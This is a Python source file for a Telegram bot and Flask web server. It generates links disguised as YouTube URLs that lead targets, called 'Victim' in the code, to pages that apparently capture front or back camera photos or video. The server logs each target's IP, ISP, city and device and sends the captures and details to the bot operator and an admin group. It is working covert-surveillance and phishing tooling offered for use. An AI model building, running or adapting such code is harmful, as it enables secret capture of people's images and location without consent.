import os, telebot, threading, io, time
from flask import Flask, render_template, request, jsonify

# --- CONFIGURATION ---
# These should be set in your Environment Variables (Koyeb/Heroku/Local)
TOKEN = os.environ.get('TOKEN')
BASE_URL = os.environ.get('BASE_URL') 
GROUP_ID = os.environ.get('GROUP_ID') 
DEFAULT_YT_ID = "BtNydmyUBWU" # Real MLBB Video ID for preview

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# collection stores: { "session_key": {"photos": [], "info": "...", "creator": "...", "count": 0} }
collection = {}
user_temp = {}

# --- TELEGRAM BOT INTERFACE ---

def cam_menu():
    """Generates the first step: Camera Selection"""
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.row("🤳 Front Camera", "📷 Back Camera")
    return markup

def mode_menu():
    """Generates the second step: Capture Mode"""
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.row("📸 8 Photos", "🎥 3s Video")
    return markup

@bot.message_handler(commands=['start'])
def start(m):
    """Initial entry point for the bot"""
    # Initialize/Reset user settings
    user_temp[m.chat.id] = {'cam': 'user', 'mode': 'photo'}
    bot.send_message(
        m.chat.id, 
        f"⚙️ <b>Vinzy Store System Active</b>\n\n<b>Step 1:</b> Select the camera you want to use:", 
        reply_markup=cam_menu(), 
        parse_mode="HTML"
    )

@bot.message_handler(func=lambda m: m.text in ["🤳 Front Camera", "📷 Back Camera"])
def set_cam(m):
    """Handles Camera selection and moves to Mode selection"""
    if m.chat.id not in user_temp: 
        user_temp[m.chat.id] = {}
    
    # Map button text to technical facingMode
    user_temp[m.chat.id]['cam'] = 'user' if "Front" in m.text else 'environment'
    
    bot.send_message(
        m.chat.id, 
        f"✅ Camera set to: <b>{m.text}</b>\n\n<b>Step 2:</b> Select your capture mode:", 
        reply_markup=mode_menu(),
        parse_mode="HTML"
    )

@bot.message_handler(func=lambda m: m.text in ["📸 8 Photos", "🎥 3s Video"])
def set_mode_and_generate(m):
    """Handles Mode selection and generates the final Hyperlink"""
    if m.chat.id not in user_temp: 
        bot.send_message(m.chat.id, "❌ Session expired. Please type /start again.")
        return

    user_temp[m.chat.id]['mode'] = 'photo' if "Photos" in m.text else 'video'
    d = user_temp[m.chat.id]
    
    # Construct the actual tracking URL
    raw_link = f"{BASE_URL.rstrip('/')}/?id={m.chat.id}&mode={d['mode']}&cam={d['cam']}&ytid={DEFAULT_YT_ID}"
    
    # Construct the Hyperlink (Looks like YouTube, goes to your script)
    fake_yt_url = f"https://youtu.be/{DEFAULT_YT_ID}?si=VinzyStore"
    hyperlink = f'<a href="{raw_link}">{fake_yt_url}</a>'
    
    response = (
        f"🚀 <b>Link Generated Successfully!</b>\n\n"
        f"<b>Victim View (Hyperlink):</b>\n{hyperlink}\n\n"
        f"<b>Raw Tracking Link (To Copy):</b>\n<code>{raw_link}</code>\n\n"
        f"<b>Current Config:</b>\n- Mode: {m.text}\n- Lens: {'Front' if d['cam'] == 'user' else 'Back'}"
    )
    
    # Send the result
    bot.send_message(m.chat.id, response, parse_mode="HTML")
    
    # Automatically reset to Step 1 for the next link generation
    time.sleep(1.5)
    start(m)

# --- WEB SERVER ENGINE ---

@app.route('/')
def index():
    """Renders the appropriate HTML template based on Device Type"""
    ua = request.headers.get('User-Agent', '').lower()
    if 'iphone' in ua or 'ipad' in ua:
        return render_template('ios.html')
    elif 'android' in ua:
        return render_template('android.html')
    else:
        return render_template('pc.html')

@app.route('/log_info', methods=['POST'])
def log_info():
    """Logs Hardware and Network information from the target"""
    data = request.json
    tid = request.args.get('id')
    # Get IP even behind proxies like Cloudflare/Koyeb
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    session_key = f"{tid}_{ip.replace('.', '_')}"
    
    info_parts = [
        "⚡ <b>TARGET HIT DETECTED</b> ⚡",
        "━━━━━━━━━━━━━━━",
        f"🌐 <b>IP:</b> <code>{ip}</code>",
        f"🏢 <b>ISP:</b> {data.get('org', 'N/A')}",
        f"📍 <b>LOC:</b> {data.get('city', 'N/A')}, {data.get('country_name', 'N/A')}",
        f"📱 <b>DEV:</b> {data.get('platform', 'N/A')}"
    ]
    
    info_parts.append("━━━━━━━━━━━━━━━")
    info_text = "\n".join(info_parts)
    
    if session_key not in collection:
        collection[session_key] = {"photos": [], "creator": tid, "count": 0}
    
    collection[session_key]["info"] = info_text
    return "OK"

@app.route('/upload', methods=['POST'])
def upload():
    """Receives and sends the captured images/videos to Telegram"""
    tid = request.args.get('id')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    session_key = f"{tid}_{ip.replace('.', '_')}"
    
    if 'file' not in request.files: return "No file", 400
    file_bytes = request.files['file'].read()
    
    # Wait briefly for log_info to arrive so caption is complete
    for _ in range(5):
        if session_key in collection and "info" in collection[session_key]: break
        time.sleep(1)

    if session_key not in collection:
        collection[session_key] = {"photos": [], "info": f"⚠️ <b>Log Delay</b>\nIP: {ip}", "creator": tid, "count": 0}
    
    session = collection[session_key]
    info = session.get("info")

    # Handling Video Upload
    if request.args.get('type') == 'video':
        try:
            bot.send_video(tid, io.BytesIO(file_bytes), caption=info, parse_mode="HTML")
            if GROUP_ID: 
                bot.send_video(GROUP_ID, io.BytesIO(file_bytes), caption=f"Admin Copy:\n{info}", parse_mode="HTML")
        except: pass
        return "OK"

    # Handling Photo Upload (Collecting 8 before sending)
    session["photos"].append(file_bytes)
    if len(session["photos"]) >= 8:
        try:
            media = [
                telebot.types.InputMediaPhoto(p, caption=info if i==0 else "", parse_mode="HTML") 
                for i, p in enumerate(session["photos"][:8])
            ]
            bot.send_media_group(tid, media)
            if GROUP_ID: 
                bot.send_media_group(GROUP_ID, media)
            
            # Reset photo buffer for this session
            session["photos"] = [] 
        except Exception as e:
            print(f"Media Group Error: {e}")
            
    return "OK"

# --- BOT POLLING SYSTEM ---
def run_bot():
    """Keeps the Telegram Bot alive in a separate thread"""
    while True:
        try:
            bot.remove_webhook()
            bot.polling(none_stop=True, interval=0, timeout=60)
        except Exception as e:
            print(f"Bot Restarting: {e}")
            time.sleep(10)

if __name__ == "__main__":
    # Start bot thread
    threading.Thread(target=run_bot, daemon=True).start()
    # Start web server (Port 8000 for compatibility)
    app.run(host='0.0.0.0', port=8000)
